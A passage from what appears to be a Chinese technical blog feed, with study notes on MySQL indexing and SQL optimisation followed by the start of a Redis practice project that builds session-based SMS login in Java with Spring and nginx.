/><p>聚集索引选取规则：</p><ol><li>如果存在主键，则主键索引就是聚集索引</li><li>如果不存在主键，则使用第一个唯一索引作为聚集索引</li><li>如果表没有主键或没有唯一索引，则InnoDB会自动生成一个rowid作为隐藏的聚集索引</li></ol><ul><li>聚集索引的叶子节点下存放的为这一行的数据</li><li>二级索引的叶子节点下存放的为该字段对应的主键值</li></ul><p>执行 <code>select * from user when name = &#39;Arm&#39;</code>，其中name为索引</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111232932026.png" alt="image-20221111232932026" style="zoom: 33%;" /><p>具体过程为：</p><ol><li>由于是根据name字段进行查询，所以先根据name&#x3D;’Arm’到name字段的二级索引中进行匹配查找。但是在二级索引中只能查找到 Arm 对应的主键值 10。</li><li>由于查询返回的数据是*，所以此时，还需要根据主键值10，到聚集索引中查找10对应的记录，最终找到10对应的行row。 </li><li>最终拿到这一行的数据，直接返回即可。</li></ol><p>回表查询：先到二级索引中查找数据，找到主键值之后，再到聚集索引中根据主键值获取数据。</p><h3 id="3-4-索引语法"><a href="#3-4-索引语法" class="headerlink" title="3.4 索引语法"></a>3.4 索引语法</h3><ol><li><p>创建索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> [ <span class="hljs-keyword">UNIQUE</span> <span class="hljs-operator">|</span> FULLTEXT ] INDEX index_name <span class="hljs-keyword">ON</span> table_name ( index_col_name,... );<br></code></pre></td></tr></table></figure></li><li><p>查看索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> INDEX <span class="hljs-keyword">FROM</span> table_name;<br></code></pre></td></tr></table></figure></li><li><p>删除索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> INDEX index_name <span class="hljs-keyword">ON</span> table_name;<br></code></pre></td></tr></table></figure></li></ol><h3 id="3-5-SQL性能分析"><a href="#3-5-SQL性能分析" class="headerlink" title="3.5 SQL性能分析"></a>3.5 SQL性能分析</h3><h4 id="3-5-1-SQL执行频率"><a href="#3-5-1-SQL执行频率" class="headerlink" title="3.5.1 SQL执行频率"></a>3.5.1 SQL执行频率</h4><p>通过如下命令，可以查看当前数据库的 INSERT、UPDATE、DELETE、SELECT的访问频次：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- show [session|global] status</span><br><span class="hljs-comment">-- session 是查看当前会话 </span><br><span class="hljs-comment">-- global 是查询全局数据 </span><br><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">GLOBAL</span> STATUS <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;Com_______&#x27;</span>;<br></code></pre></td></tr></table></figure><p>通过上述指令，我们可以查看到当前数据库到底是以查询为主，还是以增删改为主，从而为数据库优化提供参考依据。 </p><ul><li>如果是以增删改为主，我们可以考虑不对其进行索引的优化。</li><li>如果是以查询为主，那么就要考虑对数据库的索引进行优化了。</li></ul><h4 id="3-5-2-慢查询日志"><a href="#3-5-2-慢查询日志" class="headerlink" title="3.5.2 慢查询日志"></a>3.5.2 慢查询日志</h4><p>慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。</p><p>MySQL的慢查询日志默认没有开启，查看系统变量 slow_query_log。</p><p>如果要开启慢查询日志，需要在MySQL的配置文件（&#x2F;etc&#x2F;my.cnf）中配置如下信息：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 开启MySQL慢日志查询开关 </span><br><span class="hljs-attr">slow_query_log</span>=<span class="hljs-number">1</span> <br><span class="hljs-comment"># 设置慢日志的时间为2秒，SQL语句执行时间超过2秒，就会视为慢查询，记录慢查询日志 </span><br><span class="hljs-attr">long_query_time</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h4 id="3-5-3-profile详情"><a href="#3-5-3-profile详情" class="headerlink" title="3.5.3 profile详情"></a>3.5.3 profile详情</h4><p>通过 <code>show profiles</code> 能够查询出每一条命令的执行时间</p><p>通过set语句在session&#x2F;global级别开启profiling：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> profiling <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>执行完一系列业务SQL操作后，通过如下命令查询执行耗时</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看每一条SQL的耗时基本情况 </span><br><span class="hljs-keyword">show</span> profiles; <br><span class="hljs-comment">-- 查看指定query_id的SQL语句各个阶段的耗时情况 </span><br><span class="hljs-keyword">show</span> profile <span class="hljs-keyword">for</span> query query_id; <br><span class="hljs-comment">-- 查看指定query_id的SQL语句CPU的使用情况 </span><br><span class="hljs-keyword">show</span> profile cpu <span class="hljs-keyword">for</span> query query_id;<br></code></pre></td></tr></table></figure><h4 id="3-5-4-explain"><a href="#3-5-4-explain" class="headerlink" title="3.5.4 explain"></a>3.5.4 explain</h4><p>EXPLAIN 或者 DESC命令获取 MySQL 如何执行 SELECT 语句的信息，包括在 SELECT 语句执行过程中表如何连接和连接的顺序。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 直接在select语句之前加上关键字 </span><br>explain <span class="hljs-operator">/</span> <span class="hljs-keyword">desc</span> EXPLAIN <span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 <span class="hljs-keyword">WHERE</span> 条件 ;<br></code></pre></td></tr></table></figure><p>Explain 执行计划中各个字段的含义: </p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111234650646.png" alt="image-20221111234650646" style="zoom:50%;" /><h3 id="3-6-索引使用规则"><a href="#3-6-索引使用规则" class="headerlink" title="3.6 索引使用规则"></a>3.6 索引使用规则</h3><h2 id="4-SQL优化"><a href="#4-SQL优化" class="headerlink" title="4. SQL优化"></a>4. SQL优化</h2><h3 id="4-1-插入数据"><a href="#4-1-插入数据" class="headerlink" title="4.1 插入数据"></a>4.1 插入数据</h3><ul><li><p>insert优化</p><ul><li>执行批量插入：500 ~ 1000条</li><li>手动开启与提交事务</li><li>主键顺序插入</li></ul></li><li><p>大批量插入数据</p><ul><li>如果一次性需要插入大批量数据，使用insert语句插入性能较低，此时需要MySQL提供的load指令</li></ul><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221112163647221.png" alt="image-20221112163647221"></p><p>使用如下指令，将数据脚本文件中的数据加载到表结构中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 客户端连接服务端时，加上参数 -–local-infile </span><br>mysql –<span class="hljs-operator">-</span><span class="hljs-keyword">local</span><span class="hljs-operator">-</span>infile <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p <br><span class="hljs-comment">-- 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关 </span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> local_infile <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <br><span class="hljs-comment">-- 执行load指令将准备好的数据，加载到表结构中 </span><br>load data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;/root/sql1.log&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> tb_user fields <br>terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;,&#x27;</span> lines terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;\n&#x27;</span> ;<br></code></pre></td></tr></table></figure><p>开启local_infile之后，在任意一个数据库中创建一张表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tb_user` ( <br>    `id` <span class="hljs-type">INT</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT, <br>    `username` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>, <br>    `password` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>, <br>    `name` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>, `birthday` <span class="hljs-type">DATE</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>, <br>    `sex` <span class="hljs-type">CHAR</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>, <br>    <span class="hljs-keyword">PRIMARY</span> KEY (`id`), <br>    <span class="hljs-keyword">UNIQUE</span> KEY `unique_user_username` (`username`) <br>) ENGINE<span class="hljs-operator">=</span>INNODB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 ;<br></code></pre></td></tr></table></figure><p>然后在数据库上加载对应的文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">load</span> data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;/Users/xxx/Documents/load_user_100w_sort.sql&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> tb_user fields terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;,&#x27;</span> lines terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;\n&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221112164957718.png" alt="image-20221112164957718"></p><p>从中可见性能提升了很多</p></li></ul><h3 id="4-2-主键优化"><a href="#4-2-主键优化" class="headerlink" title="4.2 主键优化"></a>4.2 主键优化</h3><p>在InnoDB存储引擎中，表数据都是根据主键顺序组织存放的，这种存储方式的表称为索引组织表</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221112165939874.png" alt="image-20221112165939874" style="zoom:50%;" /><p>在InnoDB引擎中，数据行是记录在逻辑结构 page 页中的，而每一个页的大小是固定的，默认16K。那也就意味着， 一个页中所存储的行也是有限的，如果插入的数据行row在该页存储不小，将会存储到下一个页中，页与页之间会通过指针连接。</p><ul><li><p>页分裂</p><p>页可以为空，也可以填充一半，也可以填充100%。每个页包含了2-N行数据(如果一行数据过大，会行溢出)，根据主键排列。</p><ul><li>主键顺序插入时，当前页满了之后，会插入到下一页。页与页之间用指针相连。</li><li>主键乱序插入时，当插入的主键id在中间且当前页已经写满时，会将当前页的后一半数据移动到新的一页，然后再插入该主键id，此时需要重新设置页与页之间的链表指针 &#x3D;&gt; 页分裂</li></ul></li><li><p>页合并</p><ul><li>当删除一行记录时，实际上记录并没有被物理删除，只是记录被标记（flaged）为删除并且它的空间变得允许被其他记录声明使用。</li><li>当页中删除的记录达到 MERGE_THRESHOLD（默认为页的50%），InnoDB会开始寻找最靠近的页（前或后）看看是否可以将两个页合并以优化空间使用。</li></ul></li></ul><p>索引设计原则：</p><ol><li>满足业务需求的情况下，尽量降低主键的长度。</li><li>插入数据时，尽量选择顺序插入，选择使用AUTO_INCREMENT自增主键。</li><li>尽量不要使用UUID做主键或者是其他自然主键，如身份证号。</li><li>业务操作时，避免对主键的修改。</li></ol><h3 id="4-3-order-by优化"><a href="#4-3-order-by优化" class="headerlink" title="4.3 order by优化"></a>4.3 order by优化</h3><p>MySQL的排序，有两种方式：</p><ul><li>Using filesort : 通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区sortbuffer中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序。</li><li>Using index : 通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高。</li></ul><p>在优化排序操作时，尽量采用Using Index</p><p>order by优化原则</p><ol><li>根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则</li><li>尽量使用覆盖索引</li><li>多字段排序, 一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC&#x2F;DESC）</li><li>如果不可避免的出现filesort，大数据量排序时，可以适当增大排序缓冲区大小sort_buffer_size，默认256K</li></ol><h3 id="4-4-group-by优化"><a href="#4-4-group-by优化" class="headerlink" title="4.4 group by优化"></a>4.4 group by优化</h3><p>在分组操作中，我们需要通过以下两点进行优化，以提升性能：</p><ol><li>在分组操作时，可以通过索引来提高效率。</li><li>分组操作时，索引的使用也是满足最左前缀法则的。</li></ol><h3 id="4-5-limit优化"><a href="#4-5-limit优化" class="headerlink" title="4.5 limit优化"></a>4.5 limit优化</h3><p>优化思路: 一般分页查询时，通过创建 覆盖索引 能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> tb_sku t , (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> tb_sku <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">2000000</span>,<span class="hljs-number">10</span>) a <span class="hljs-keyword">where</span> t.id <span class="hljs-operator">=</span> a.id;<br></code></pre></td></tr></table></figure><h3 id="4-6-count优化"><a href="#4-6-count优化" class="headerlink" title="4.6 count优化"></a>4.6 count优化</h3><p>当表的数据量很大时，对表执行count操作是非常耗时的</p><ul><li>MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高； 但是如果是带条件的count，MyISAM也慢。</li><li>InnoDB执行 count(*) 的时候，需要把数据一行一行地从引擎里面读出来，然后累积计数。</li><li>如果想大幅度提升InnoDB表的count效率，可以借助Redis手动统计计数</li></ul><p>count用法：count(字段) &lt; count(主键 id) &lt; count(1) ≈ count(*)</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221112200822172.png" alt="image-20221112200822172" style="zoom:50%;" /><h3 id="4-7-update优化"><a href="#4-7-update优化" class="headerlink" title="4.7 update优化"></a>4.7 update优化</h3><p>在采用update语句进行更新数据操作时，最好将索引作为查询数据的条件。这是因为InnoDB的行锁是针对索引加锁，而不是针对记录加锁。如果索引失效，则行锁会自动升级为表锁。</p>]]></content>
    
    
    <categories>
      
      <category>数据库及缓存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
      <tag>事务</tag>
      
      <tag>索引</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis笔记:实战篇</title>
    <link href="/2022/11/05/Redis%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%88%98%E7%AF%87/"/>
    <url>/2022/11/05/Redis%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%88%98%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis实战篇"><a href="#Redis实战篇" class="headerlink" title="Redis实战篇"></a>Redis实战篇</h1><h2 id="1-短信登录"><a href="#1-短信登录" class="headerlink" title="1. 短信登录"></a>1. 短信登录</h2><p>项目整体架构如下：</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221025174859439.png" alt="image-20221025174859439" style="zoom: 33%;" /><p>通过Nginx将前端请求转发到后端服务器中，Redis与MySQL作为数据库。</p><h3 id="1-1-导入项目"><a href="#1-1-导入项目" class="headerlink" title="1.1 导入项目"></a>1.1 导入项目</h3><ol><li><p>创建hmdp数据库，导入SQL文件 <code>hmdp.sql</code></p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221025171044276.png" alt="image-20221025171044276"></p><p>表介绍：</p><ul><li>tb_user：用户表</li><li>tb_user_info：用户详情表</li><li>tb_shop：商户信息表</li><li>tb_shop_type：商户类型表</li><li>tb_blog：用户日记表（达人探店日记）</li><li>tb_follow：用户关注表</li><li>tb_voucher：优惠券表</li><li>tb_voucher_order：优惠券订单表</li></ul></li><li><p>导入后端项目：<code>hm-dianping</code></p><p>将application.yaml文件中MySQL与Redis配置修改为自己的</p><p>之后启动SpringBoot项目，并访问 <code>http://localhost:8081/shop-type/list</code>，显示出数据则说明配置成功！</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221025172132464.png" alt="image-20221025172132464"></p></li><li><p>导入前端项目：配置nginx</p><p>由于我使用的是Mac M1，用homebrew安装的nginx，分享一下我的配置方法</p><ol><li><p>将 <code>/opt/homebrew/etc/nginx/nginx.conf</code> 修改为老师提供的nginx配置文件（修改前记得备份之前的配置文件）</p></li><li><p>将 <code>/opt/homebrew/var/www</code> 下的文件全部替换为老师提供的nginx包下的html下的文件</p></li><li><p>采用如下命令更新配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nginx -c <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br></code></pre></td></tr></table></figure></li><li><p>采用如下命令重启nginx</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -s reload</span><br></code></pre></td></tr></table></figure></li><li><p>访问 <code>localhost:8080</code>，即可成功</p></li></ol></li></ol><h3 id="1-2-基于Session的短信登录"><a href="#1-2-基于Session的短信登录" class="headerlink" title="1.2 基于Session的短信登录"></a>1.2 基于Session的短信登录</h3><h4 id="1-2-1-流程分析"><a href="#1-2-1-流程分析" class="headerlink" title="1.2.1 流程分析"></a>1.2.1 流程分析</h4><h5 id="服务端发送短信验证码流程"><a href="#服务端发送短信验证码流程" class="headerlink" title="服务端发送短信验证码流程"></a>服务端发送短信验证码流程</h5><ol><li>服务端接收到手机号，校验手机号是否符合规则，符合则进入下一步</li><li>生成验证码，并将验证码保存到Session中</li><li>发送验证码</li></ol><h5 id="短信验证码登录与注册流程"><a href="#短信验证码登录与注册流程" class="headerlink" title="短信验证码登录与注册流程"></a>短信验证码登录与注册流程</h5><ol><li>用户提交手机号与验证码，服务端校验验证码，若正确，则进入下一步</li><li>根据手机号查询信息<ul><li>若用户存在，登陆成功，保存用户到Session</li><li>若用户不存在，用户为新用户，则将其保存到数据库中，保存用户到Session</li></ul></li></ol><h5 id="校验登录状态"><a href="#校验登录状态" class="headerlink" title="校验登录状态"></a>校验登录状态</h5><ol><li>用户访问网站，携带Cookie，通过Cookie中的SessionID获取对应的Session，从Session中获取用户信息，判断信息是否有效<ul><li>若信息有效，用户存在，则将信息保存到ThreadLocal中，便于后续使用</li><li>若信息无效，用户不存在，结束</li></ul></li></ol><h4 id="1-2-2-功能实现"><a href="#1-2-2-功能实现" class="headerlink" title="1.2.2 功能实现"></a>1.2.2 功能实现</h4><h5 id="发送短信验证码"><a href="#发送短信验证码" class="headerlink" title="发送短信验证码"></a>发送短信验证码</h5><ol><li><p>更改controller包下UserController中的sendCode方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;code&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">sendCode</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;phone&quot;)</span> String phone, HttpSession session)</span> &#123;<br>    <span class="hljs-comment">// TODO 发送短信验证码并保存验证码</span><br>    <span class="hljs-keyword">return</span> userService.sendCode(phone, session);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在UserServiceImpl中实现该方法</p><p>注意：验证码的发送用log输出日志模拟一下即可，表示发送成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">sendCode</span><span class="hljs-params">(String phone, HttpSession session)</span> &#123;<br>    <span class="hljs-comment">// 1.校验手机号</span><br>    <span class="hljs-keyword">if</span> (RegexUtils.isPhoneInvalid(phone)) &#123;<br>        <span class="hljs-comment">// 2.如果不符合，返回错误信息</span><br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;手机号格式错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 3.符合，生成验证码</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> RandomUtil.randomNumbers(<span class="hljs-number">6</span>);<br>    <span class="hljs-comment">// 4.保存验证码到Session</span><br>    session.setAttribute(<span class="hljs-string">&quot;code&quot;</span>, code);<br>    <span class="hljs-comment">// 5.发送验证码</span><br>    log.debug(<span class="hljs-string">&quot;发送短信验证码成功，验证码：&#123;&#125;&quot;</span>, code);<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h5 id="登录与注册"><a href="#登录与注册" class="headerlink" title="登录与注册"></a>登录与注册</h5><ol><li><p>更改Controller包下UserController中的login方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> LoginFormDTO loginForm, HttpSession session)</span>&#123;<br>    <span class="hljs-comment">// TODO 实现登录功能</span><br>    <span class="hljs-keyword">return</span> userService.login(loginForm, session);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在UserService中实现该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(LoginFormDTO loginForm, HttpSession session)</span> &#123;<br>    <span class="hljs-comment">// 1.校验手机号</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> loginForm.getPhone();<br>    <span class="hljs-keyword">if</span> (RegexUtils.isPhoneInvalid(phone)) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;手机号格式错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 2.校验验证码</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cacheCode</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;code&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> loginForm.getCode();<br>    <span class="hljs-keyword">if</span> (cacheCode == <span class="hljs-literal">null</span> || !cacheCode.equals(code)) &#123;<br>        <span class="hljs-comment">// 3.不一致报错</span><br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;验证码错误&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 4.一致，根据手机号查询用户</span><br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;phone&quot;</span>, phone).one();<br>    <span class="hljs-comment">// 5.判断用户是否存在</span><br>    <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 6.不存在，创建用户并保存</span><br>        user = createUserWithPhone(phone);<br>    &#125;<br>    <span class="hljs-comment">// 7.保存用户信息到Session</span><br>    session.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br><br><span class="hljs-keyword">private</span> User <span class="hljs-title function_">createUserWithPhone</span><span class="hljs-params">(String phone)</span> &#123;<br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>    user.setPhone(phone);<br>    user.setNickName(USER_NICK_NAME_PREFIX + RandomUtil.randomString(<span class="hljs-number">10</span>));<br>    save(user);<br>    <span class="hljs-keyword">return</span> user;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h5 id="登录校验拦截器"><a href="#登录校验拦截器" class="headerlink" title="登录校验拦截器"></a>登录校验拦截器</h5><p>情景分析：</p><p>登录完成之后，一些请求需要校验用户的登录状态，然后才能允许执行进一步的操作（比如查看订单等）</p><p>如果在每个请求的方法中都添加校验逻辑，会增加很多冗余代码。</p><p>因此，我们采用登录校验拦截器，在请求到达每个Controller之前，对其做校验，获取用户信息。</p><p>为了避免线程安全问题，将用户信息保存到ThreadLocal中，这样每个请求对应着自己的用户信息，互不干扰。</p><ol><li><p>在utils包下创建LoginInterceptor</p><p>UserHolder其实是一个工具类，用于将用户信息保存到ThreadLocal以及从ThreadLocal中取用户信息</p><p>移除用户是为了防止内存泄露</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1.获取session</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>        <span class="hljs-comment">// 2.获取session中的用户</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-comment">// 3.判断用户是否存在</span><br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 4.不存在则拦截</span><br>            response.setStatus(<span class="hljs-number">401</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-comment">// 5.存在则保存用户信息到ThreadLocal</span><br>        UserHolder.saveUser((User) user);<br>        <span class="hljs-comment">// 6.放行</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, 